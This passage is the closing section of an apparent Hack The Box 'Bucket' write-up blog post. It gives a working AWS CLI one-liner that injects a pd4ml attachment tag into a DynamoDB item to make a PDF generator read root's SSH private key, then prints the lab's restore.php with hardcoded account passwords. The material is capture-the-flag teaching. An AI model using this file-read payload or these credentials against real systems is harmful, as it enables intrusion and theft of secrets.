</pre></table></code></div></div><p>Note that we need to escape double quotes. I generated the PDF and after running strings the file contents were there!</p><p><em>Local file read as root</em></p><p><img src="/assets/posts_details/Bucket/images/privesc13.png" alt="Img" /></p><p>To get a root shell I included <code class="highlighter-rouge">/root/.ssh/id_rsa</code> instead to get the root user private SSH key. Now, I needed to generate the table each time because it was getting deleted so I just combined the two commands in a one-liner:</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://127.0.0.1:4566 \
&amp;&amp; aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "&lt;pd4ml:attachment src=\"file:/root/.ssh/id_rsa\" description=\"attachment sample\"/&gt;"}}' --endpoint-url http://127.0.0.1:4566
</pre></table></code></div></div><p><em>Getting root’s private key</em></p><p><img src="/assets/posts_details/Bucket/images/privesc14.png" alt="Img" /></p><p>Then we can just SSH in with the key and get the hash!</p><p><em>SSHing as root</em></p><p><img src="/assets/posts_details/Bucket/images/privesc15.png" alt="Img" /></p><h2 id="afterthoughts">Afterthoughts</h2><p>As always, someething I like to do when I root a box is to see how things work. On this case there were a lot of scripts in the root directory.</p><p><em>/root directory list</em></p><p><img src="/assets/posts_details/Bucket/images/afterthoughts1.png" alt="Img" /></p><p>We can see that the local DynamoDB instance works via Docker and that the adserver was being wiped clean every 60 seconds, which was annoying.</p><p><em>Box scripts</em></p><p><img src="/assets/posts_details/Bucket/images/afterthoughts2.png" alt="Img" /></p><p>Another interesting script was <code class="highlighter-rouge">restore.php</code>, called in <code class="highlighter-rouge">restore.sh</code> above. This proves my idea that the <code class="highlighter-rouge">alerts</code> table wasn’t yet created as <code class="highlighter-rouge">$params</code> is only passed to <code class="highlighter-rouge">$dynamodb-&gt;deleteTable($params)</code> but not to <code class="highlighter-rouge">$dynamodb-&gt;createTable()</code>.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
</pre><td class="rouge-code"><pre>#!/usr/bin/php
<span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">'/var/www/bucket-app/vendor/autoload.php'</span><span class="p">;</span>
<span class="nb">date_default_timezone_set</span><span class="p">(</span><span class="s1">'America/New_York'</span><span class="p">);</span>
<span class="kn">use</span> <span class="nn">Aws\DynamoDb\DynamoDbClient</span><span class="p">;</span>
<span class="kn">use</span> <span class="nn">Aws\DynamoDb\Exception\DynamoDbException</span><span class="p">;</span>

<span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Aws\Sdk</span><span class="p">([</span>
    <span class="s1">'profile'</span> <span class="o">=&gt;</span> <span class="s1">'default'</span><span class="p">,</span>
    <span class="s1">'region'</span>  <span class="o">=&gt;</span> <span class="s1">'us-east-1'</span><span class="p">,</span>
    <span class="s1">'version'</span> <span class="o">=&gt;</span> <span class="s1">'latest'</span><span class="p">,</span>
    <span class="s1">'endpoint'</span> <span class="o">=&gt;</span> <span class="s1">'http://localhost:4566'</span>
<span class="p">]);</span>

<span class="nv">$dynamodb</span> <span class="o">=</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="na">createDynamoDb</span><span class="p">();</span>
<span class="nv">$params</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s1">'TableName'</span> <span class="o">=&gt;</span> <span class="s1">'alerts'</span>
<span class="p">];</span>
<span class="nv">$tableName</span><span class="o">=</span><span class="s1">'users'</span><span class="p">;</span>
<span class="k">try</span> <span class="p">{</span>
<span class="nv">$response</span> <span class="o">=</span> <span class="nv">$dynamodb</span><span class="o">-&gt;</span><span class="na">createTable</span><span class="p">([</span>
	<span class="s1">'TableName'</span> <span class="o">=&gt;</span> <span class="nv">$tableName</span><span class="p">,</span>
	<span class="s1">'AttributeDefinitions'</span> <span class="o">=&gt;</span> <span class="p">[</span>
		<span class="p">[</span>
			<span class="s1">'AttributeName'</span> <span class="o">=&gt;</span> <span class="s1">'username'</span><span class="p">,</span>
			<span class="s1">'AttributeType'</span> <span class="o">=&gt;</span> <span class="s1">'S'</span>
		<span class="p">],</span>
		<span class="p">[</span>
			<span class="s1">'AttributeName'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span><span class="p">,</span>
			<span class="s1">'AttributeType'</span> <span class="o">=&gt;</span> <span class="s1">'S'</span>
		<span class="p">]</span>
	<span class="p">],</span>
	<span class="s1">'KeySchema'</span> <span class="o">=&gt;</span> <span class="p">[</span>
		<span class="p">[</span>
			<span class="s1">'AttributeName'</span> <span class="o">=&gt;</span> <span class="s1">'username'</span><span class="p">,</span>
			<span class="s1">'KeyType'</span> <span class="o">=&gt;</span> <span class="s1">'HASH'</span>
		<span class="p">],</span>
		<span class="p">[</span>
			<span class="s1">'AttributeName'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span><span class="p">,</span>
			<span class="s1">'KeyType'</span> <span class="o">=&gt;</span> <span class="s1">'RANGE'</span>
		<span class="p">]</span>
	<span class="p">],</span>
	<span class="s1">'ProvisionedThroughput'</span> <span class="o">=&gt;</span> <span class="p">[</span>
             <span class="s1">'ReadCapacityUnits'</span>    <span class="o">=&gt;</span> <span class="mi">5</span><span class="p">,</span>
             <span class="s1">'WriteCapacityUnits'</span> <span class="o">=&gt;</span> <span class="mi">5</span>
        <span class="p">]</span>
<span class="p">]);</span>

<span class="nv">$response</span> <span class="o">=</span> <span class="nv">$dynamodb</span><span class="o">-&gt;</span><span class="na">putItem</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
    <span class="s1">'TableName'</span> <span class="o">=&gt;</span> <span class="nv">$tableName</span><span class="p">,</span>
    <span class="s1">'Item'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'username'</span>   <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'S'</span> <span class="o">=&gt;</span> <span class="s1">'Cloudadm'</span><span class="p">),</span>
        <span class="s1">'password'</span>  <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'S'</span> <span class="o">=&gt;</span> <span class="s1">'Welcome123!'</span><span class="p">)</span>
    <span class="p">)</span>
<span class="p">));</span>

<span class="nv">$response</span> <span class="o">=</span> <span class="nv">$dynamodb</span><span class="o">-&gt;</span><span class="na">putItem</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
    <span class="s1">'TableName'</span> <span class="o">=&gt;</span> <span class="nv">$tableName</span><span class="p">,</span>
    <span class="s1">'Item'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'username'</span>   <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'S'</span> <span class="o">=&gt;</span> <span class="s1">'Mgmt'</span><span class="p">),</span>
        <span class="s1">'password'</span>  <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'S'</span> <span class="o">=&gt;</span> <span class="s1">'Management@#1@#'</span><span class="p">)</span>
    <span class="p">)</span>
<span class="p">));</span>

<span class="nv">$response</span> <span class="o">=</span> <span class="nv">$dynamodb</span><span class="o">-&gt;</span><span class="na">putItem</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
    <span class="s1">'TableName'</span> <span class="o">=&gt;</span> <span class="nv">$tableName</span><span class="p">,</span>
    <span class="s1">'Item'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'username'</span>   <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'S'</span> <span class="o">=&gt;</span> <span class="s1">'Sysadm'</span><span class="p">),</span>
        <span class="s1">'password'</span>  <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'S'</span> <span class="o">=&gt;</span> <span class="s1">'n2vM-&lt;_K_Q:.Aa2'</span><span class="p">)</span>
    <span class="p">)</span>
<span class="p">));}</span>
<span class="k">catch</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s1">'Message: '</span> <span class="o">.</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>
<span class="p">}</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$dynamodb</span><span class="o">-&gt;</span><span class="na">deleteTable</span><span class="p">(</span><span class="nv">$params</span><span class="p">);</span>
</pre></table></code></div></div><h2 id="conclusion">Conclusion</h2><p>This is everything, I hope you enjoyed the writeup and learned something new. It was definitely a cool box that made me learn a lot about new things, but most importantly taught me to think what the box is used for and where the vulnerabilities could be. If you liked it you can give me respect on Hack The Box through the following link: <a href="https://www.hackthebox.eu/home/users/profile/31531">https://www.hackthebox.eu/home/users/profile/31531</a>. Until next time!</p><hr /><p><em>Diego Bernal Adelantado</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >Hack The Box</a> <a href="/tags/pentesting/" class="post-tag no-text-decoration" >Pentesting</a> <a href="/tags/pdf/" class="post-tag no-text-decoration" >PDF</a> <a href="/tags/aws/" class="post-tag no-text-decoration" >AWS</a> <a href="/tags/dynamodb/" class="post-tag no-text-decoration" >DynamoDB</a> <a href="/tags/s3/" class="post-tag no-text-decoration" >S3</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox: Bucket write-up - GoDiego&url=https://diego95root.github.io/posts/Bucket/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox: Bucket write-up - GoDiego&u=https://diego95root.github.io/posts/Bucket/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox: Bucket write-up - GoDiego&url=https://diego95root.github.io/posts/Bucket/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://diego95root.github.io/posts/Bucket/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Fuse/">HackTheBox: Fuse write-up</a></li><li><a href="/posts/Magic/">Hack The Box: Magic write-up</a></li><li><a href="/posts/Cache/">HackTheBox: Cache write-up</a></li><li><a href="/posts/Blunder/">HackTheBox: Blunder write-up</a></li><li><a href="/posts/Admirer/">HackTheBox: Admirer write-up</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/permissions/">Permissions</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/enumeration/">Enumeration</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/file-upload/">File Upload</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/STO-Azure/" class="btn btn-outline-primary"><p>Subdomain Takeover in Azure: making a PoC</p></a> <a href="/posts/Academy/" class="btn btn-outline-primary"><p>HackTheBox: Academy write-up</p></a></div><!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Cache/"><div class="card-body"> <span class="timeago small"> Jun 11, 2020 <i class="unloaded">2020-06-11T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox: Cache write-up</h3><div class="text-muted small"><p>Hack The Box: Cache machine write-up We are back again with a new machine! Cache starts with a simple static website from which we get some hints that there is a virtual host. From there we find a...</p></div></div></a></div><div class="card"> <a href="/posts/Blunder/"><div class="card-body"> <span class="timeago small"> Jul 3, 2020 <i class="unloaded">2020-07-03T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox: Blunder write-up</h3><div class="text-muted small"><p>Hack The Box: Blunder machine write-up Blunder is an easy box based on a not so popular CMS, called Blundit. We start by finding a hidden file by bruteforcing and after reading the content of the ...</p></div></div></a></div><div class="card"> <a href="/posts/Fuse/"><div class="card-body"> <span class="timeago small"> Aug 21, 2020 <i class="unloaded">2020-08-21T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox: Fuse write-up</h3><div class="text-muted small"><p>Hack The Box: Fuse machine write-up Fuse was a Windows box that I found to be pretty complex despite it’s medium difficulty rating. It is mostly based on thorough enumeration on different services...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js" crossorigin="anonymous"></script> <script type="text/javascript"> const el = document.querySelectorAll('#post-wrapper img'); const observer = lozad(el); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/secfaults">Diego Bernal Adelantado</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/permissions/">Permissions</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/enumeration/">Enumeration</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/file-upload/">File Upload</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-167902069-1', 'auto'); ga('send', 'pageview'); </script> --> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-167902069-1" crossorigin="anonymous"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-167902069-1'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://diego95root.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
